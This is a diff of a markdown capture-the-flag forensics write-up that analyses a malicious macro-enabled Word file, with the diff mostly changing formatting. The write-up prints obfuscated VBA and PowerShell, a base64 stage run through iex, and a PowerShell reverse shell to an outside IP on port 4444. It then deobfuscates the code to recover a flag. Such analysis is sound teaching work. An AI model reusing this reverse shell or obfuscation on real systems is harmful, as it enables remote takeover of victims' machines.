@@ -1,9 +1,7 @@
-# Forensics
-
-## 0x00 Invitation
+# Invitation
 ---
 _We were given [this](forensics_invitation.zip) Microsoft word file with **.docm** file extension._
-### Solution
+## Solution
 ---
 Basically, Microsoft fies with __.*x__ extension like **.docx**, **.pptx**, **.xlsx**, etc are compressed files, that means they can be opened with any zip archive software. Since, the extension is **.docm**, it clearly shows that it contains macros.  
 
@@ -11,7 +9,7 @@ Basically, Microsoft fies with __.*x__ extension like **.docx**, **.pptx**, **.x
 
 A malicious code (generally in VBA) can be hidden inside these files.
 
->My first step was to extract macros form this file. We can use oletools but I will be using an online tool called [OnlineHashCrack](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php).
+*My first step was to extract macros form this file. We can use oletools but I will be using an online tool called [OnlineHashCrack](https://www.onlinehashcrack.com/tools-online-extract-vba-from-office-word-excel.php).*
 
 ![online_out](images/S0.jpg)
 
@@ -25,7 +23,7 @@ some_func("656e202d656e6320") &
 str1 & str2 & str3 & str4, 1)
 ```
 
->Now I tried to debug the code using an online debugger ([tutorialspoint.com](https://www.tutorialspoint.com/compile_vb.net_online.php)), then I printed the final command that was to be executed :
+*Now I tried to debug the code using an online debugger ([tutorialspoint.com](https://www.tutorialspoint.com/compile_vb.net_online.php)), then I printed the final command that was to be executed :*
 
 ![online_debug](images/S1[0].jpg)
 
@@ -83,7 +81,7 @@ if ($installed) {
 iex ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($payloadBase64)));
 ```
 
-Again, there was another layer of obfuscation by adding more base46 encoded data. Decoding the value of the payload we get : 
+*Again, there was another layer of obfuscation by adding more base46 encoded data. Decoding the value of the payload we get :* 
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("196.2333.54.2",4444);
@@ -101,14 +99,14 @@ $client.Close()
 We can clearly see that the code is trying to create a reverse shell to the attacker (in our case, IP is invalid, obviously.). But, still we do not get the flag : (
 
 
->Then I got back to initial code and try to debug the first line.
+*Then I got back to initial code and try to debug the first line.*
 ```powershell
 . ( $PshomE[4]+$pshoMe[30]+'x') ( [strinG]::join('' , ([REGeX]::MaTCHES( ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&|
 )43]RAhc[]GnIRTs[,'tXj'(eCALPER.)'$','wqi'(eCALPER.)';tX'+'jera_scodlam'+'{B'+'T'+'HCtXj '+'= p'+'gerwqi'(" ,'.' ,'R'+'iGHTtOl'+'eft' ) | 
 FoREaCH-OBJecT {$_.VALUE} ))  )
 ```
 
->As we remove unnecessary "+" and letter caps we instantly we see `righttoleft` method. We can use python to reverse the string.
+*As we remove unnecessary "+" and letter caps we instantly we see `righttoleft` method. We can use python to reverse the string.*
 
 ```python
 x = ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(ecalper.)'$','wqi'(ecalper.)';tXjera_scodlam{BTHCtXj = pgerwqi'("
@@ -116,11 +114,11 @@ x = ")'x'+]31[DIlLeHs$+]1[DiLLehs$ (&| )43]RAhc[]GnIRTs[,'tXj'(ecalper.)'$','wqi
 print(x[::-1])
 ```
 
->Again by replacing unnecessary caps and "+" we get:
+*Again by replacing unnecessary caps and "+" we get:*
 
 `"('iqwregp = jXtCHTB{maldocs_arejXt;').replace('iqw','$').replace('jXt',[string][char]34) |&( $shellid[1]+$shellid[13]+'x')"`
 
->We start to see our flag and by again debugging unnecessary replace we get:
+*We start to see our flag and by again debugging unnecessary replace we get:*
 
 ```powershell
 `"('$regp = jXtCHTB{maldocs_arejXt;').replace('jXt',[string][char]34) |&('iex')"`
@@ -128,7 +126,7 @@ print(x[::-1])
 
 > Flag 1 : CHTB{maldocs_are
 
->Similarly, we simplify this command:
+*Similarly, I simplified this command :*
 
 ```powershell
 SEt ("G8"+"h")  (  
